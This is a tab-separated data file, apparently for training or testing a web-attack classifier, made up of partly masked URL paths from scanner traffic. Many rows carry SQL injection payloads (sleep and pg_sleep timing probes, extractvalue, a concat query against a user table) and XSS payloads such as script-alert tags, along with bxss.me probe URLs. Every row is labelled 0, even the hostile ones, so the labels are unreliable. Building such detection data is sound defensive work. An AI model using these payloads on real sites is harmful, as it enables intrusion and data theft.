sentences	labels
/*****/general/diary/new/submit.php \r\n\r\n 	 0
/****/jtdt/2020_jtyw/ and 1>1 \r\n\r\n 	 0
/*/doinfo/addinfo.php \r\n\r\n 	 0
/******//636/n3znjzz1/xhr_send?t=1632346140281 \r\n\r\n 	 0
/***/800/11/07/71/11077159_769451.jpg \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/**********/system/2020/04/24/javascript:void(0); \r\n\r\n 	 0
/*****/gywm/index.shtml/"><script>alert(15)</script> \r\n\r\n 	 0
/******/resource/code/datainput.jsp?owner=') and 3887=3887 and ('1'='1 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(7570)">?_=1630312617878 \r\n\r\n 	 0
/*****/admin/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 0
/***/index.php?c=dt&a=editor&do=design&id=295& \r\n\r\n 	 0
/****/czgk/bmjs/zzqjcyxt/xxqrmjcy/\"javascript:void(0)\" \r\n\r\n 	 0
/****/zpdt/202010/t20201009_254278.html" and "x"="y \r\n\r\n 	 0
/************/template/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/****/system/2006/09/23/javascript:dozoom(9) \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml'""()&%<acx><script >khwe(9675)</script>_2127/hygq_2064/list.html \r\n\r\n 	 0
/****/zfxxgk1/fdzdgknr' and 2*3*8=6*8 and 'uue2'='uue2.htm \r\n\r\n 	 0
/***/col209/'""()&%<acx><script >rgmp(9630)</script>.html \r\n\r\n 	 0
/************/categorysearch.do?cateid=1&p=1&q=bxss.me&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/****/czgk/bmjs/rmtt/\"javascript:void(0)\" \r\n\r\n 	 0
/****/mtgz/if(now()=sysdate(),sleep(15),0)_mtgz/202107/t20210712_310551.html \r\n\r\n 	 0
/**********/system/more/javascript:alert(1850)/0045/217000000000000_00004535.shtml \r\n\r\n 	 0
/******/resource/js' and 2*3*8=6*8 and 'uejk'='uejk/newcalendar/config.js \r\n\r\n 	 0
/****/country/:'""()&%<acx><script >aha2(9874)</script> \r\n\r\n 	 0
/**/products/electricequipment/201505/t20150513_60359.html \r\n\r\n 	 0
/********/music_out.php?p=29'<script>alert(777)</script> \r\n\r\n 	 0
/****/system/2021/12/19/javascript:window.print() \r\n\r\n 	 0
/*/191211-8/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/****/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 0
/***/dsp_editcreative.cfm?attributes.siteid="">alert(777) \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/'""()&%<acx><script >1itm(9683)</script>/hzrecorder.js \r\n\r\n 	 0
/***/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/****/20210907/javascript:void(0); \r\n\r\n 	 0
/*/210909-2/index/753947'""()&%<acx><script >u4vx(9369)</script>c86c4981426850a2ab09d4614a.css \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1%') or 2831=2831 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/tzgg/\"javascript:void(0)\" \r\n\r\n 	 0
/****/zjdt/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 0
/****/20210601/javascript:void(0); \r\n\r\n 	 0
/****/zfxxgk/fdzdgknr/qtfdxx/qzqd/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394);select pg_sleep(5)-- \r\n\r\n 	 0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm \r\n\r\n 	 0
/**/ui/widgets/hanweb/placeholder/css/placeholder"" and 2*3*8=6*8 and ""nzi0""=""nzi0.css \r\n\r\n 	 0
/**********/system/2021/10/01/javascript:window.print() \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(395)</script>?_=1630311391750 \r\n\r\n 	 0
/*/public/viewclick/?addclick='""()&%<acx><script >qon1(9202)</script>&classid=168&id=10226 \r\n\r\n 	 0
/******/resource/code/datainput.jsp?owner=%' or 4144=9455  \r\n\r\n 	 0
/**********/system/2007/11/02/002244239.shtml \r\n\r\n 	 0
/****/czgk/bmjs/zzqfyxt/xqqrmfy/\"javascript:void(0)\" \r\n\r\n 	 0
/******/if(now()=sysdate(),sleep(12),0)/js/ajax.js \r\n\r\n 	 0
/****/index.php?title=acunetixtest440875&action=submit \r\n\r\n 	 0
/***/data:image/svg xml;charset=utf-8,<svg xmlns='http://www.w3.org/2000/svg' viewbox='0 0 27 44'><path d='m27,22l27,22l5,44l-2.1-2.1l22.8,22l2.9,2.1l5,0l27,22l27,22z' fill='#007aff'/></svg> \r\n\r\n 	 0
/****/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 0
/******/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 0
/***/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]=exp&i_webid[1]==extractvalue(1,concat(char(126),md5(1602390990)))&type=1 \r\n\r\n 	 0
/*****/fiyo/?app=article&view=item31ab2"">alert(777)0ccba&id=186 \r\n\r\n 	 0
/****/gjzz/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/******/457//xfs.bxss.me.css \r\n\r\n 	 0
/*****/system/2015/04/30/011702718.shtml \r\n\r\n 	 0
/****/compact.cfm?fusebox.ajax="">alert(777) \r\n\r\n 	 0
/*******/cmd/anonymous<script>alert(777)</script>test.jsp \r\n\r\n 	 0
/****/system/2011/03/04/javascript:window.close(); \r\n\r\n 	 0
/**/anq/javascript:void(0); \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033' or 0024=0024 and '1'='1&owner=1707212448 \r\n\r\n 	 0
/***/abantecart/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> \r\n\r\n 	 0
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') and 2510=8916  \r\n\r\n 	 0
/wp-content/*******/admin-menu-editor/menu-editor.php \r\n\r\n 	 0
/***/bxss.me/t/xss.html? \r\n\r\n 	 0
/****/system/2017/03/31/javascript:dozoom(9) \r\n\r\n 	 0
/*****/system/2008/11/14/002633410.shtml \r\n\r\n 	 0
/**/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
